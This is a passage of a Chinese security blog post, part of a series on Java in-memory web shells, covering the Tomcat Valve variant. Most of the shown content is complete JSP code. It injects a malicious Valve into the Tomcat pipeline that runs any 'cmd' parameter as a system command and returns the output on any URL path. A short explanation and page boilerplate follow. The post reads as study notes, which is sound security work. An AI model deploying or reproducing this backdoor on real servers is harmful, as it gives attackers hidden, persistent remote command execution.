+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;org.apache.catalina.connector.Response&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.io.IOException&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> contentType</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;text/html;charset=UTF-8&quot;</span><span style="color: #E06C75"> language</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> reqF </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;request&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">reqF</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Request</span><span style="color: #E06C75"> req </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Request) </span><span style="color: #E5C07B">reqF</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(request);</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">StandardContext</span><span style="color: #E06C75"> standardContext </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (StandardContext) </span><span style="color: #E5C07B">req</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Pipeline</span><span style="color: #E06C75"> pipeline </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">standardContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getPipeline</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #56B6C2">&lt;%!</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Shell_Valve</span><span style="color: #E06C75"> </span><span style="color: #C678DD">extends</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ValveBase</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> invoke</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Request</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">request</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Response</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ServletException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">cmd</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cmd&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (cmd </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">cmd</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">()) {</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 1. 执行命令并获取输出流</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">java</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">io</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">InputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(cmd).</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">java</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">util</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Scanner</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> java.</span><span style="color: #E5C07B">util</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Scanner</span><span style="color: #ABB2BF">(in).</span><span style="color: #61AFEF">useDelimiter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">A&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">output</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNext</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">?</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">s</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">next</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 2. 将结果直接写回 response</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output);</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getWriter</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #7F848E; font-style: italic">// 3. 匹配到命令后直接 return，不再往下走（拦截）</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">            }</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #7F848E; font-style: italic">// 4. 重要！！如果没有 cmd 参数，必须交给下一个 Valve，否则网页会打不开</span></span>
+<span class="line"><span style="color: #ABB2BF">            </span><span style="color: #61AFEF">getNext</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(request, response);</span></span>
+<span class="line"><span style="color: #ABB2BF">        }</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">}</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #56B6C2">&lt;%</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Shell_Valve</span><span style="color: #E06C75"> shell_valve </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Shell_Valve</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">pipeline</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">addValve</span><span style="color: #ABB2BF">(shell_valve);</span></span>
+<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>
+
+<p>访问Valve.jsp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414222246304.png" srcset="/img/loading.gif" lazyload alt="image-20260414222246256"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260414222742350.png" srcset="/img/loading.gif" lazyload alt="image-20260414222741973"></p>
+</li>
+</ul>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>感觉在学会 Servlet 内存马之后，看 Valve 内存马就比较简单了</p>
+<p>总而言之，Valve 型内存马是基于 Servlet 内存马来实现的，但是在表现形式上面会稍微有一点区别，之前 Servlet 内存马，我们是写入了一个路径，但是 Valve 型内存马可以在 Servlet 被读取的过程中就直接被恶意触发。</p>
+<blockquote>
+<p>前面我们的Valve 型内存马也添加了路径，这个路径不是因为 <strong>Valve</strong> 需要路径，而是因为你的 <strong>“运载工具”（Servlet ）</strong> 需要路径。</p>
+<p>而且这个路径的本质意思是：</p>
+<p>注入成功Valva内存马<code>http://localhost:8080/secret_shell?cmd=whoami</code>，<code>secret_shell</code>无论是什么，不存在也好，都会得到whoami</p>
+<p>而Servlet得固定路径，如果你注册的是 <code>/shell</code>，那么只有访问 <code>/shell</code> 才会触发。访问 <code>/secret_shell</code> 时，Tomcat 在路由表里找不到对应的 Servlet，就会直接返回 404，你的马根本没机会运行。</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内存马系列---Valve型</div>
+      <div>http://example.com/2026/04/24/内存马系列---Valve型/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Piggy Sprint</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/24/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97---Spring%E5%9E%8B/" title="内存马系列---Spring型">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内存马系列---Spring型</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Servlet%E5%9E%8B/" title="内存马系列--Servlet型">
+                        <span class="hidden-mobile">内存马系列--Servlet型</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/custom/LoadingBar/pace.min.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/RandomBanner.js"></script>
+<script src="/js/Background.js"></script>
+<script src="/js/Sidebar.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
+</html>
